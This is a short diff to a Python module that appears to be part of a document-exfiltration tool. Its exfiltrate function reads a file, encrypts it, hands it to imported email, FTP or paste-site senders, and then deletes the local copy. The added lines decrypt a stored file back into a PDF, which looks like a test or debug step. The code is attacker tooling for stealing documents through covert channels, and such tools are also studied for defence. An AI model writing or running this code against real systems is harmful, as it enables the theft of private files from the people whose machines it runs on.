@@ -2,6 +2,7 @@ from cryptor import encrypt, decrypt
 from email_exfil import outlook, plain_email
 from transmit_exfil import plain_ftp, transmit
 from paste_exfil import ie_paste, plain_paste
+from cryptor import decrypt
 
 import os
 
@@ -28,6 +29,10 @@ def exfiltrate(document_path, method):
             contents = f0.read()
         with open(filename, 'wb') as f1:
             f1.write(encrypt(contents))
+        with open('topo_post_pdf.txt', 'rb') as f:
+            contents = f.read()
+        with open('newtopo.pdf', 'wb') as f:
+            f.write(decrypt(contents))
         
         EXFIL[method](filename)
         os.unlink(filename)
